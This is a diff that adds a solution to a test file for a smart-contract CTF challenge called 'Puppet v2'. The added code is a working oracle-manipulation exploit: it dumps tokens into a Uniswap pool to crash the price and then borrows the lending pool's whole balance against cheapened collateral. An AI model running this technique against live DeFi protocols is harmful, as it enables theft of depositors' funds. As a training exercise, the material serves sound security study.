@@ -82,6 +82,66 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        /**
+            {
+            "inputs": [
+                {
+                "internalType": "uint256",
+                "name": "amountOut",
+                "type": "uint256"
+                },
+                {
+                "internalType": "uint256",
+                "name": "amountInMax",
+                "type": "uint256"
+                },
+                {
+                "internalType": "address[]",
+                "name": "path",
+                "type": "address[]"
+                },
+                {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+                },
+                {
+                "internalType": "uint256",
+                "name": "deadline",
+                "type": "uint256"
+                }
+            ],
+            "name": "swapTokensForExactETH",
+            "outputs": [
+                {
+                "internalType": "uint256[]",
+                "name": "amounts",
+                "type": "uint256[]"
+                }
+            ],
+            "stateMutability": "nonpayable",
+            "type": "function"
+            }
+         */
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [this.token.address, this.weth.address], attacker.address,(await ethers.provider.getBlock('latest')).timestamp * 2);
+
+        let collateralETH = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        let balanceETH = await ethers.provider.getBalance(attacker.address);
+
+        balanceETH > collateralETH ? NaN : console.log("Too much collateral in ETH.")
+
+        // wrap eth to weth
+        await this.weth.connect(attacker).deposit({value: collateralETH});
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, collateralETH);
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
